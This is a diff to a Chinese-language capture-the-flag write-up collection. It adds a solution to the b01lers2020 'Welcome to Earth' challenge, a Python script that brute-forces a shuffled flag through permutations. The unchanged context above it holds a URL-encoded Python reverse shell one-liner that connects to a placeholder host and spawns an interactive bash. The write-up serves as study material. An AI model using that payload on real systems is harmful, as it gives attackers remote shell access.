@@ -4149,3 +4149,25 @@ url解码之后就是 `?code=phpinfo();`
         ```bash
         python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
         ```
+
+## b01lers2020 Welcome to Earth(python 排列组合库)
+
+根据js代码一步一步获得下一页面路径，最终得到打乱的flag,由于不知道key，所以没办法逆推出来，只能爆破。
+
+```python
+from itertools import permutations
+import re
+
+flag = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"]
+
+# 对flag中的内容进行排列组合
+item = permutations(flag)
+
+# 遍历
+for i in item:
+    k = ''.join(list(i))
+    # 匹配
+    if re.search('^pctf\{hey_boy[a-zA-Z_]+ck!\}$',k):
+    # if k.startswith('pctf{hey_boy') and k[-1] == '}':
+        print(k)
+```
